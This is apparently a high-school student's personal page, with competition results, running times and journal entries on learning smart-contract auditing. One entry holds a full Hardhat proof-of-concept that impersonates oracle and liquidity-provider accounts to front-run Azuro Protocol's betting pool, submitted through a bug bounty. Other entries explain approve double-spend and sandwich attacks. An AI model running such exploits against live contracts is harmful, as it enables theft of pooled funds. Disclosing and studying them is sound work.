# Brian Zhang, Harrison High School

I am a high schooler currently attending William Henery Harrison High School. My interests include competetive programming, running, and painting. I mainly participate in the USACO competition series, and I am currently in the Gold Division. I run a Competetive Programming Club at my school whilst also participating in the National Science Bowl and the AMC/AIME competitions, as well as being a part of the school track team.

What's happening to me:
Pre 2021-
Mathcounts: State 8th place Individual, 6th place Team
AIME Qualified 2021
AIME Qualified 2020
AIME Qualified 2019

2021-2022
PSAT: 1510 (1520 MAX)

First Half Marathon: 1:37 time

AIME: Qualified

USACO Dec - Didn't pass

USACO Jan- Didn't pass due to issues with print
    Competetive Programming Club - 1 pass bronze, 0 silver, 0 gold

USACO Feb - Didn't pass
    Competetive Programming Club - 3 pass bronze, 0 silver, 0 gold

SAT: 1570 (1600 MAX)

National Sci Bowl: 2nd place in Indiana [Picture here]

Academic Super Bowl: 1rst place NCC Champion [Picture here]

NHS: Accepted into National Honor Society [Picture here]

Prometheus Sci Bowl: Eliminated first round, unfortunately

USACO Open - Didn't pass, recieved 750 out of the 800 required points
    //(Note: I feel hella depressed)

Academic Super Bowl State 2nd in Math, 1rst in Science [Picture here], two teams tied for first place.

Ended my track season w/ a 5:08 mile, not yet sub 5, but close.

5/21/22 Running in the rain is the best [Picture here]
        Bugs are the coolest in any game, WarHammer 40k, StartCraft, MTG, etc. [Picture here]

## 6/20/22 
Recently starting auditing smart contracts on immunefi with user @izhuer. Today, I just recieved my first payout from auditing Azuro Procotol(https://azuro.org/). 


![Payment :D](https://www.dropbox.com/s/tpbt4thzoq7lvvf/firstpayment.png?dl=0&raw=1)


Included is a POC of that contract and an explanation:

```solidity= 
const ethers = hre.ethers;

async function main() {
    // get malicious LP and user
    const [LP1, LP2, user] = await ethers.getSigners();

    // get constract
    pool = await ethers.getContractAt("LP", "0x31acF17c04f27Bb7DE1cf2fDfa8785950A05b80A");
    azuro = await ethers.getContractAt("Core", "0x7ce09c4401694F80b4352407A2df59A2D339C32A");
    azuroBet = await ethers.getContractAt("AzuroBet", "0x8ca27099AD224984e90Fd95D8de30D7B1cF523eb"); 

    // send some USDT to LPs and user
    USDT = await ethers.getContractAt("TestERC20", "0xb64a99a6a34a719b323655cee9fc0d3f61b5d7ef");
    USDTOwnerAddress = await USDT.owner();
    console.log("[*] the owner of USDT:", USDTOwnerAddress);
    await hre.network.provider.request({
          method: "hardhat_impersonateAccount",
          params: [USDTOwnerAddress],
    });
    USDTOwner = await ethers.getSigner(USDTOwnerAddress);
    await USDT.connect(USDTOwner).mint(LP1.address, ethers.utils.parseEther("20000.0"));
    await USDT.connect(USDTOwner).mint(LP2.address, ethers.utils.parseEther("20000.0"));
    await USDT.connect(USDTOwner).mint(user.address, ethers.utils.parseEther("40000.0"));
    await USDT.connect(LP1).approve(pool.address, ethers.constants.MaxUint256);
    await USDT.connect(LP2).approve(pool.address, ethers.constants.MaxUint256);
    await USDT.connect(user).approve(pool.address, ethers.constants.MaxUint256);

    // impersonate an oracle
    oracleAddress = '0x834dd1699f7ed641b8fed8a57d1ad48a9b6adb4e';
    await hre.network.provider.request({
          method: "hardhat_impersonateAccount",
          params: [oracleAddress],
    });
    oracle = await ethers.getSigner(oracleAddress);

    // impersonate a maintainer
    maintainerAddress = '0x628d2714f912aab37e00304b5ff0283be7dff75f';
    await hre.network.provider.request({
          method: "hardhat_impersonateAccount",
          params: [maintainerAddress],
    });
    maintainer = await ethers.getSigner(maintainerAddress);

    // to make it simple, we let the only LP withdraw his funds
    // Note that it is not really necessary, just for discussion simplifity
    oldLPToken = await pool.nextNode() - 1;
    oldLPAddress = "0x2c33fee397eea9a3573a31a2ea926424e35584a1";
    await hre.network.provider.request({
          method: "hardhat_impersonateAccount",
          params: [oldLPAddress],
    });
    oldLP = await ethers.getSigner(oldLPAddress);
    // XXX: we cannot withdraw it once, due to an overflow in LiquidityTree:123
    await pool.connect(oldLP).withdrawLiquidity(oldLPToken, ethers.BigNumber.from('500000000000'));
    await pool.connect(oldLP).withdrawLiquidity(oldLPToken, ethers.BigNumber.from('1000000000000'));
    
    // LP1 and LP2 add liquidity
    LP1Token = await pool.nextNode();
    await pool.connect(LP1).addLiquidity(ethers.utils.parseEther("20000.0"));
    LP2Token = await pool.nextNode();
    await pool.connect(LP2).addLiquidity(ethers.utils.parseEther("20000.0"));

    // create a condition
    const blockNum = await ethers.provider.getBlockNumber();
    const block = await ethers.provider.getBlock(blockNum);
    const targetTs = block.timestamp + 3600;
    await azuro.connect(oracle).createCondition(
        10, // oracleCondId
        20, // scopeId,
        [ethers.utils.parseEther("0.00005"), ethers.utils.parseEther("0.00005")], // odds
        [1, 2], // outcomes
        targetTs, // timestamp
        "0x0000000000000000000000000000000000000000000000000000004141414141", // ipfsHash
    );
    conditionId = await azuro.oracleConditionIds(oracle.address, 10);
    console.log("[*] the oracle create a condition - done");
   
    // user puts bet
    await pool.connect(user).bet(conditionId, ethers.utils.parseEther("20000.0"), 1, targetTs, 0);
    console.log("[*] the user bets - done");

    // let's wait the condition start
    await ethers.provider.send("evm_increaseTime", [144000])
    await ethers.provider.send('evm_mine');
    console.log("Hi");
    frontrun = (process.env['AZURO_FRONTRUN'] = 'TRUE');
    console.log("Bye");
    if (frontrun) {
        console.log("[*] LP1 front-run to avoid loss");
        await pool.connect(LP1).withdrawLiquidity(LP1Token, ethers.BigNumber.from('1000000000000'));
    }
    console.log("Here");
    // resolve condition
    await azuro.connect(oracle).resolveCondition(10, 1);
    console.log("[*] the oracle resolves condition - done");

    if (!frontrun) {
        console.log("[*] LP1 withdraws his funds");
        await pool.connect(LP1).withdrawLiquidity(LP1Token, ethers.BigNumber.from('1000000000000'));
    }
    
    console.log("[*] front-run attack enabled?", frontrun);
    console.log("[*] amount LP1 can withdraw", await USDT.balanceOf(LP1.address));
    console.log("[*] amount LP2 can withdraw", await pool.nodeWithdrawView(LP2Token));
}

main().then(() => process.exit(0)).catch((error) => {
    console.error(error);
    process.exit(1);
});
```

the gist is that Azuro Protocol is a betting site, and betters can either place bets on events such as games, sports, etc, or place money into a reward pool, called the liquidity pool. Excess money from bets is placed into the pool, and if a bet needs more money, that is taken from the pool. Pool placers, or Liquidity poolers (LP) earn the percentage of the pool that they put in. 

The bug was that an LP could see when bets would lose money in the pool, and could withdraw their input in the pool before the pool lost money, thus saving them from the monetary loss. This could be done by Front-Running the contract, simply providing more gas for a call so that it is prioritized over other calls.

This is a really interesting bug, as I learned that function calls can be exploited due to gas loading.
______________________________________________________________________________

## 6/21/22

In my spare time, I have also begun auditing in the Code4rena competition. Generally, these competitions are easier to audit. The contract I am currently working on is this one:

![Contest](https://www.dropbox.com/s/jvfx780n90bdvxu/nibbl.png?dl=0&raw=1)

It is a contract made to split ERC721 tokens, which are things like pictures, or objects, which there only exists one of, into ERC20 tokens, which are similar to coins, and multiple of one token can exist at one time.

______________________________________________________________________________

## 6/22/22

Fractionalization is the process of locking in an ERC721 token and creating ERC20 tokens representing ownership of the NFT. For Nibbl, there is a valuation-driven fractionalization process to buyout an ERC721 token. It also helps in auditing to determine which contract inherit what, for example, NibblVault in the Nibbl contract represents an ERC20 token, used to represent owenership of the ERC721. This is what the Nibbl contract aims to do.

Here is an explanation of the surface-level actions of the Nibbl contract:

The Nibble Contract enables an owner, or curator, to lock in an ERC721 token in a Nibbl vault. The curator also provides a fee to do this, an in turn, is minted a certain amount of Nibbl tokens in return. Other people can choose to "buy" this token, resulting in an amount minted based on the primary and secondary curves of the contract. Vice versa, buyers can "sell" their Nibbl tokens, resulting in a refund and the burning of the Nibbl tokens. 

Anyone can initiate a buyout at any point by calling the buyout function with a deposit based on the valuation of the vault. The valuation is defined as the number of Nibbl tokens minted multiplied by the value of the Nibbl tokens. After a preset period of time, the user who initated the buyout function will gain ownership of the ERC721 token. Other users can choose to stop the buyout by increasing the valuation of the vault by a preset percentage. This is done by buying Nibbl tokens.

Once a buyout ends, Nibbl holders may redeem their Nibbl tokens for a percentage of the total amount earned by the vault from the buying. The new owner of the ERC721 token can also redeem their token, as well. 

No matter what, the owner of the ERC721 token will earn money through fees that apply to every transaction that occurs within a vault from begining to end.

This seems like a pretty solid contract. It's short, as well. Short contracts usually are not as breakable as longer ones. 
______________________________________________________________________________

## 6/23/22

Today I was exposed to a double attack. Essentially, this is one of the most exploitable attacks which almost everyone should check first when auditing contracts. Essentially, it has to do with the way that the solidity ```approve``` function works. 

Imagine User Bob allows User Alice $50. Then, imagine if User Bob wants to change that allowance to $30 instead. A double attack would be when Bob goes to call the allowance command, Alice frontruns, sending that $50 elsewhere. This allows ALice to have an addition $30 to spend, in total, $80, which is far more than Bob's ideal allowance of $30.

Also, sandwhich attacks are where once a certain function is called by a victim or a contract, a malicious user will frontrun something in front of the function call, and then call something after the function call, hence affecting the way that the function interacts with the blockchain.
______________________________________________________________________________

## 6/24/22

When looking at a contract, once you understand, think that you are any one of the many roles that a contract provides, like owner, user, maintainer, validator ... 

______________________________________________________________________________

## [7/5/22](https://hackmd.io/nrDLrEnDTz-CSCnz-PBu_Q?both)
## [7/6/22](https://hackmd.io/lpQyCmHpSkiNn9YLEqWWhQ?view)
## [7/7/22](https://hackmd.io/r5_FEOQGSjeQBD5GEAgUtg)
## [7/8/22](https://hackmd.io/vg1mkSg1QaiOKtwYhaKXVg)


CV(https://www.google.com)

 Email: bzhangprogramming@gmail.com
 
 Discord: ItsNio#9708

 ![This is me!](https://user-images.githubusercontent.com/72953251/152267180-6cc7e19d-bc92-40cd-bafb-e2cdfd373eb1.jpg)
  
![Pumpkin_Fast_Zombie_Animated](https://user-images.githubusercontent.com/72953251/152265973-d0486df6-e0cb-4f82-996d-6d61feb32364.gif)


